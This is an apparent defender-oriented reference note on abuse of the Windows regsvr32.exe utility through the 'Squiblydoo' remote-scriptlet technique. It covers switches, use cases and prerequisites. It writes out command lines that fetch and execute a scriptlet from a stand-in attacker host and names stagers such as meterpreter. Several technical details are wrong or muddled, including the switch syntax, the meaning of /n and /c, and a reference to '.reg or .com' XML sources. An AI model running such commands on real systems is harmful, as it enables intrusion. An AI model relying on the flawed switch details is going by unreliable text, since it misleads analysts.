# LOLBins — regsvr32.exe — Overview

> 🔴 **Red Flag Principle:** `regsvr32.exe` with the `/i` (unattended install mode) switch and a URL points to the "Squiblydoo" technique — a fileless, registry-bypass code-execution pattern that downloads and executes arbitrary JScript or VBScript from a remote source. The two invariant tells are: (1) the **argument shape itself** — `/i` + `/s` (silent) + a URL with `.sct` extension (scriptlet file format) is unambiguous; argument alone survives binary rename and path relocation; and (2) when the scriptlet is hosted locally or fetched via direct file:// URI, **the registry machinery is entirely bypassed** — inspection of the `.reg` or `.com` file's XML source reveals the executed code directly, making this one of the few LOLBins techniques where the payload itself survives to disk and can be recovered in plaintext.

## Contents
- [History](#history)
- [How It Works](#how-it-works)
- [Techniques / Protocols Used](#techniques--protocols-used)
- [Command-Line Switches — Quick Reference](#command-line-switches--quick-reference)
- [Legitimate vs. Abused Verbs](#legitimate-vs-abused-verbs)
- [Quick Use-Case List](#quick-use-case-list)
- [Prerequisites](#prerequisites)

---

## History

`regsvr32.exe` is not an offensive-security tool — it's a native Windows registry-server utility included with every Windows installation since Windows 3.1, part of the OS's COM (Component Object Model) self-registration machinery. Its legitimate purpose, documented by Microsoft, is to register or unregister dynamic-link libraries (DLLs), ActiveX controls, and component libraries into the system registry.

> "Regsvr32.exe is a utility used to register and unregister OLE controls, including ActiveX controls, in the Windows registry. The file is part of the Windows operating system and is present in %SystemRoot%\System32\ and %SystemRoot%\SysWOW64\ on 32-bit and 64-bit systems respectively."
> — [Microsoft Learn, `regsvr32` reference](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32)

The tool has existed since the **Windows 3.1** era (circa 1992) as the registry-server self-registration utility; modern Windows (Vista and later) maintains backward compatibility. Microsoft's own documentation explicitly notes that `regsvr32.exe` is included for legacy component registration — modern best practice for DLL registration uses alternative mechanisms (e.g., Windows Installer or PowerShell cmdlets), but the tool persists as a built-in utility on every system.

Its abuse as a "living-off-the-land binary" (LOLBIN) — specifically the **Squiblydoo technique** that repurposes the `/i` (install/run) switch to load and execute remote scriptlet files — is catalogued by the **[LOLBAS Project](https://lolbas-project.github.io/)** (`LOLBAS-Project/LOLBAS` on GitHub), documented in the `Regsvr32.yml` entry (verified against the live GitHub source), crediting initial research to Casey Smith (`@subTee`) and Proofpoint researchers. Squiblydoo itself is named after a community nickname for the technique pattern.

## How It Works

`regsvr32.exe` exposes two distinct abuse patterns:

**1. The Squiblydoo technique (`/i:[URL] /s [scriptlet]`).** The `/i` switch — officially designed for "unattended install mode" during COM self-registration — accepts an optional URL parameter that points to a remote scriptlet file (`.sct` extension). When a DLL or scriptlet is passed with `/i:<URL>`, `regsvr32.exe` fetches the scriptlet from the URL and loads it into memory, bypassing traditional file-system and registry-write auditing. The scriptlet itself is XML — an ActiveX control descriptor format — which can embed JScript or VBScript code inside `<script>` tags. This embedded script executes inside the context of `regsvr32.exe` itself, with **no child process spawned** and no DLL registration happening.

```
regsvr32 /i:<URL> /s scrobj.dll
  or
regsvr32 /i:[http(s)://attacker.com/payload.sct] /s "C:\any\local\path.sct"

           ↓

regsvr32.exe process loads scriptlet (JScript/VBScript XML) from URL
           ↓
embedded script executes in-process (no child process, no registration)
           ↓
typical payload: meterpreter, Empire stager, keylogger, etc.
```

The `scrobj.dll` argument is conventional — it's a dummy/placeholder argument that allows `regsvr32.exe` to proceed with scriptlet loading. Since the actual work happens inside the scriptlet itself, the DLL name/path doesn't matter as long as it exists somewhere `regsvr32.exe` can reference (it doesn't validate that a DLL with that name actually loads properly — the scriptlet execution happens first).

- **Fileless execution:** The scriptlet is fetched and executed from memory; no standalone `.sct` file needs to land on disk (unless the operator chooses to save it).
- **No child process:** Everything runs inside the single `regsvr32.exe` process, producing no parent→child spawn chain an analyst hunting process-tree events would catch.
- **Registry bypass:** The legitimate self-registration path (which would write COM registration entries to `HKLM\SOFTWARE\Classes\CLSID\`, etc.) is bypassed entirely — only the `/i` scriptlet execution happens.
- **Scriptlet source flexibility:** The scriptlet can come from HTTP/HTTPS, a local file path, or even `file://` URIs — all produce the same code-execution result.

**2. The direct DLL registration abuse.** `regsvr32.exe` can be pointed at any DLL (local or remote, via UNC path or HTTP) and instructed to register it. Malicious DLLs execute their `DllRegisterServer` export automatically during registration. This is less common than Squiblydoo in the wild but a real alternative — confirmed by LOLBAS's own `Regsvr32.yml` entry.

This note focuses primarily on Squiblydoo (the scriptlet pattern), since it's the more distinctive, documented pattern and the one with the strongest community research record.

## Techniques / Protocols Used

| Layer | Detail |
|---|---|
| Transport (Squiblydoo only) | HTTP/HTTPS to fetch the remote scriptlet; can also be local file:// URI or UNC `\\host\share\file.sct` |
| Transport (direct DLL) | Can reference local path, UNC path, or HTTP/HTTPS URL for the DLL |
| Script engine | JScript or VBScript embedded in the `.sct` XML scriptlet — executed by the Windows Script Host engine invoked inside `regsvr32.exe` |
| Execution context | Runs as whatever user/token invoked it — **no elevation required** for Squiblydoo execution (LOLBAS lists "User" privilege); direct DLL registration may require elevation depending on the target registry hive |
| Process model | Single process, no children, no services, no scheduled tasks — all work (including script execution) happens inside `regsvr32.exe` itself |
| Binary location | `C:\Windows\System32\regsvr32.exe` and `C:\Windows\SysWOW64\regsvr32.exe` — the two legitimate OS install paths per LOLBAS's `Full_Path` listing |

## Command-Line Switches — Quick Reference

Verified against [Microsoft Learn's `regsvr32` reference](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32) and the [LOLBAS Project's `Regsvr32.yml`](https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/). `regsvr32` ships with a minimal set of switches focused on COM registration; the `/i` (install) and `/n` (no display) modifiers are the ones that surface for abuse.

**Core registration verbs (legitimate use only, not abused)**

| Switch | Meaning |
|---|---|
| `/u` | **Unregister** — removes a DLL/control from the registry |
| `/c` | **Console** — displays status messages in a console window (default for most uses) |
| `/s` | **Silent** — suppresses all status messages and prompts; when combined with `/i:<URL>`, hides scriptlet execution completely from any visible UI |

**Install/execution mode (abuse surface for Squiblydoo)**

| Switch | Meaning |
|---|---|
| `/i [URL]` | **Install mode (unattended).** Normally used during COM self-registration to suppress interactive prompts; abuse: when followed by a URL, loads and executes the remote scriptlet at that URL. The URL can be HTTP/HTTPS, a local file path, or a UNC path. If no URL is given, `/i` alone registers the DLL without interactive prompts. |
| `/i:[URL]` | Alternative syntax with the colon — functionally identical to `/i [URL]` |
| `/n` | **No display** — suppresses the "DllRegisterServer entry point not found" success/failure dialog (available in some Windows versions; less reliably documented than `/i` and `/s`) |

**Modifier flags used with the verbs above**

| Flag | Meaning |
|---|---|
| `/s` | **Silent mode.** Suppresses all output and error messages. Commonly paired with `/i:<URL>` to hide scriptlet execution from any console or dialog output. |

## Legitimate vs. Abused Verbs

For contrast, and because an analyst reading a `regsvr32.exe` command line needs to know what *normal* component-registration activity looks like: `regsvr32`'s actual bread-and-butter verbs are simple cases like:

```cmd
regsvr32.exe C:\Windows\System32\atl.dll
regsvr32.exe C:\Program Files\SomeApp\Component.dll
regsvr32.exe /u C:\Program Files\LegacyControl\Control.ocx
```

These register or unregister legitimate DLLs and ActiveX controls — the DLL's own code (specifically its `DllRegisterServer` export) is allowed to run as part of the registration process, but the invocation itself is tied to a local, trusted DLL path that makes sense for the application being installed. A `/i:<http://attacker.com/payload.sct>` invocation with a remote HTTP scriptlet is not something that workflow produces.

## Quick Use-Case List

- Squiblydoo scriptlet download and execution — fileless code execution via remote JScript/VBScript
- Local scriptlet file execution with `/i` — loading a malicious `.sct` from an attacker-controlled path on disk or a UNC share
- Silent execution with `/s` flag combined with `/i:<URL>` — suppressing all UI feedback during scriptlet run
- Chained download-and-execute one-liner — fetch and run a stager (meterpreter, Empire, etc.) in one command
- Renamed or relocated `regsvr32.exe` binary — defeating simple image-path-based detection
- UNC-path scriptlet execution — loading the `.sct` from an internal file share (no outbound Internet traffic required)
- Bypassing AppLocker/WDAC via signed-binary-proxy — `regsvr32.exe` is Microsoft-signed and allowlisted by default in most policies
- Staged secondary payload delivery — post-initial-access foothold staging of a full C2 agent via Squiblydoo
- Direct malicious DLL registration — passing an attacker-authored DLL to execute its `DllRegisterServer` export

## Prerequisites

| Requirement | Notes |
|---|---|
| Code execution on the target | Any existing foothold that can run a command line — a macro, a script, an interactive shell, a C2 task. `regsvr32.exe` is not itself an initial-access vector |
| Privilege level | **None beyond a standard user token** — Squiblydoo (the `/i:<URL>` technique) requires only `User` privilege. Direct DLL registration to system-wide registry hives may require elevation, but this note's focus is on Squiblydoo, which does not |
| Network reachability (Squiblydoo with HTTP/HTTPS) | Outbound HTTP/HTTPS to the scriptlet-hosting URL. No network required at all for local/UNC-path scriptlet loading or for direct DLL-registration patterns |
| Scriptlet source | The operator needs the scriptlet (`.sct` file, XML format with embedded JScript/VBScript) either hosted remotely or available locally/on a UNC share. The scriptlet is human-readable XML and can be crafted or generated by a payload-generator framework (Empire, msfvenom via Metasploit, etc.) |
| Target OS version | Windows XP and later — `regsvr32.exe` is a long-standing utility; Squiblydoo abuse is documented across all modern Windows versions (7 through 11) |
